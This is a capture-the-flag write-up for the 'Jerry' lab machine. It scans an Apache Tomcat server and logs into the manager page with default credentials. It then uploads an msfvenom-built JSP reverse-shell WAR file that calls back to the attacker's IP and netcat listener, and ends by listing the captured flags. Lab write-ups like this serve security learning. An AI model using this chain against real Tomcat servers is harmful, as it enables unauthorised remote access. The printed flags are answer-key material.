# Jerry

## IP	
> 10.10.10.95

## nmap scan

```nmap -T4 -p- -A 10.10.10.95 -Pn```

```a
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
```

## Open Ports
       
>8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1

## HTTP
We now that the server is running "Apache Tomcat/7.0.88"

I performed a gobuster in the website such as 

```gobuster dir -u http://10.10.10.95:8080/ -w /usr/share/wordlists/dirb/common.txt```

and the results where 

>/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/favicon.ico          (Status: 200) [Size: 21630]             
/host-manager         (Status: 302) [Size: 0] [--> /host-manager/]
/manager              (Status: 302) [Size: 0] [--> /manager/]     

If we go to http://10.10.10.95:8080/manager it will prompt for a username and password so we can try the default 

> username: tomcat
> password: s3cret

They work! we now have access to the tomcat manager page but it did not work for http://10.10.10.95:8080/host-manager

We can also use the wordlists that are online for tomcat or use a metasploit attack

Now that we are inside manager we see that we can add a ".war" file so lets create a payload with msfvenom 

```msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.197 LPORT=4445 -f war > ex.war```

Like this we will create ex.war

Now we upload the file and start a listener in our machine

```nc -nvlp 4445```

We access http://10.10.10.95:8080/ex and we get a shell!

Now we are inside the machine

### Getting the Flags
```
cd ../Users/Administrator/Desktop/flags
type "2 for the price of 1.txt"
```

>user.txt
7004dbcef0f854e0fb401875f26ebd00

>root.txt
04a8b36e1545a455393d067e772fe90e

We can also get a meterpreter shell following [[Create a meterpreter shell when only have normal shell]] 

